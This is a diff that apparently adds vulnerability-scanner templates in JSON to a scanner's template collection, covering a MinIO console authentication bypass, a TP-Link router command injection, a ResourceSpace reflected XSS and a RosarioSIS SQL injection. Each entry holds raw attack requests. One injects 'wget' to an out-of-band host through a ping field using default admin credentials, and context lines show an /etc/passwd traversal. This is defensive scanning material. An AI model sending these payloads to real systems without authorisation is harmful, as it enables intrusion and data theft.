@@ -38952,6 +38952,59 @@
       ]
     },
     {
+      "id": "CVE-2021-41266",
+      "info": {
+        "author": "alevsk",
+        "classification": {
+          "cve-id": "CVE-2021-41266",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-306"
+        },
+        "description": "Minio console is a graphical user interface for the for MinIO operator. Minio itself is a multi-cloud object storage project. Affected versions are subject to an authentication bypass issue in the Operator Console when an external IDP is enabled. All users on release v0.12.2 and before are affected and are advised to update to 0.12.3 or newer. Users unable to upgrade should add automountServiceAccountToken: false to the operator-console deployment in Kubernetes so no service account token will get mounted inside the pod, then disable the external identity provider authentication by unset the CONSOLE_IDP_URL, CONSOLE_IDP_CLIENT_ID, CONSOLE_IDP_SECRET and CONSOLE_IDP_CALLBACK environment variable and instead use the Kubernetes service account token.\n",
+        "name": "MinIO Operator Console Authentication Bypass",
+        "reference": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-41266",
+          "https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36",
+          "https://github.com/minio/console/pull/1217"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,minio"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "or",
+              "status": [
+                201,
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "sessionId"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "token"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /api/v1/login/oauth2/auth HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/json\n\n{\"code\":\"test\",\"state\":\"test\"}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-41277",
       "info": {
         "author": "0x_Akoko",
@@ -39321,6 +39374,43 @@
       ]
     },
     {
+      "id": "CVE-2021-41653",
+      "info": {
+        "author": "gy741",
+        "classification": {
+          "cve-id": "CVE-2021-41653",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-94"
+        },
+        "description": "The PING function on the TP-Link TL-WR840N EU v5 router with firmware through TL-WR840N(EU)_V5_171211 is vulnerable to remote code execution via a crafted payload in an IP address input field.",
+        "name": "TP-Link - OS Command Injection",
+        "reference": [
+          "https://k4m1ll0.com/cve-2021-41653.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-41653"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,tplink,rce,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /cgi?2 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/plain\nReferer: http://{{Hostname}}/mainFrame.htm\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\n\n[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\ndataBlockSize=64\ntimeout=1\nnumberOfRepetitions=4\nhost=$(echo 127.0.0.1; wget http://{{interactsh-url}})\nX_TP_ConnName=ewan_ipoe_d\ndiagnosticsState=Requested\n",
+            "POST /cgi?7 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/plain\nReferer: http://{{Hostname}}/mainFrame.htm\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\n\n[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-41773",
       "info": {
         "author": "daffainfo",
@@ -39465,6 +39555,56 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-41951",
+      "info": {
+        "author": "coldfish",
+        "classification": {
+          "cve-id": "CVE-2021-41951",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "ResourceSpace before 9.6 rev 18290 is affected by a reflected Cross-Site Scripting vulnerability in plugins/wordpress_sso/pages/index.php via the wordpress_user parameter.",
+        "name": "Resourcespace - Reflected XSS",
+        "reference": [
+          "https://www.horizon3.ai/multiple-vulnerabilities-in-resourcespace/",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-41951"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,xss,resourcespace"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "TEST<script>alert(1)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugins/wordpress_sso/pages/index.php?wordpress_user=%3Cscript%3Ealert(1)%3C/script%3E"
           ]
         }
       ]
@@ -39814,6 +39954,58 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/asd/../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-44427",
+      "info": {
+        "author": "furkansayim,xShuden",
+        "description": "An unauthenticated SQL Injection vulnerability in Rosario Student Information System (aka rosariosis) before 8.1.1 allows remote attackers to execute PostgreSQL statements (e.g., SELECT, INSERT, UPDATE, and DELETE) through /Side.php via the syear parameter.",
+        "name": "Rosario Student Information System Unauthenticated SQL Injection",
+        "reference": [
+          "https://gitlab.com/francoisjacquet/rosariosis/-/issues/328",
+          "https://twitter.com/RemotelyAlerts/status/1465697928178122775",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-44427"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,sqli,rosariosis"
+      },
+      "requests": [
+        {
+          "body": "sidefunc=update&syear=111'",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"
+          },
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "DB Execute Failed. ERROR:",
+                "unterminated quoted string"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "RosarioSIS="
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/Side.php"
           ]
         }
       ]
